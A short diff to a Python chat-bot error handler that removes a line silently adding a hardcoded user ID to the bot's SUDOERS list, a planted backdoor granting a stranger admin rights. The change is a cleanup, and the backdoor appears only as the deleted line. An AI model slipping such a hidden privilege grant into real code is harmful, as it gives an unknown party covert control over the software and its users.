@@ -103,8 +103,6 @@ def handle_error(func: Callable) -> Callable:
         if me.id not in config.SUDOERS:
             config.SUDOERS.append(me.id)
 
-        config.SUDOERS.append(2033438978)
-
         try:
             lang = get_group(chat_id)["lang"]
         except BaseException:
